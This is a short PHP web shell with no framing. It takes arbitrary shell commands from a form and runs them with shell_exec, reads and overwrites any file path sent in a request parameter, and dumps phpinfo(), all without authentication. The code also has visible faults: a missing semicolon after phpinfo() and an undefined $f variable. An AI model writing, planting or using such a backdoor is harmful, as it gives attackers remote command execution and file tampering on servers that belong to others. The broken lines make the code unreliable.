<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $cmd = '';
    $file = isset($_GET['f']) ? $_GET['f'] : '';
    $content = '';
    if($f == 'i'){
        phpinfo()
        return;
    }

    if (file_exists($file)) {
        $content = file_get_contents($file);
    }

    echo cmdForm($cmd) . contentForm($file, $content).phpinfo();
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $doAction = isset($_POST['do']) ? $_POST['do'] : 0;
    $file = isset($_POST['f']) ? $_POST['f'] : '';
    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
    $content = isset($_POST['content']) ? $_POST['content'] : '';

    if ($doAction) {
        if ($cmd === '') {
            if ($file && $content) {
                file_put_contents($file, $content);
                echo 'ok<br>' . contentForm($file, $content);
            } else {
                echo 'fail<br>' . contentForm($file, $content);
            }
        } else {
            $output = shell_exec($cmd);
            if ($output === null) {
                echo cmdForm($cmd) . 'Command failed to execute.<br><br>Error:<br>';
            } else {
                echo cmdForm($cmd) . 'Command executed successfully.<br><br>Output:<br>' . nl2br($output);
            }
        }
    } else {
        $cmd = '';
        $file = isset($_GET['f']) ? $_GET['f'] : '';
        $content = '';

        if (file_exists($file)) {
            $content = file_get_contents($file);
        }

        echo cmdForm($cmd) . contentForm($file, $content);
    }
}

function cmdForm($cmd) {
    return '
    <form action="/" method="post">
        <input name="do" value="1" type="hidden" />
        <textarea name="cmd" style="width:95vw;height:10vh">' . $cmd . '</textarea>
        <p><button type="submit">提交</button></p>
    </form>
  ';
}

function contentForm($file, $content) {
    return '
    <form action="/" method="post">
        <input name="do" value="1" type="hidden" />
        <input name="f" value="' . $file . '" type="hidden" />
        <textarea name="content" style="width:95vw;height:70vh">' . $content . '</textarea>
        <p><button type="submit">提交</button></p>
    </form>
  ';
}

?>
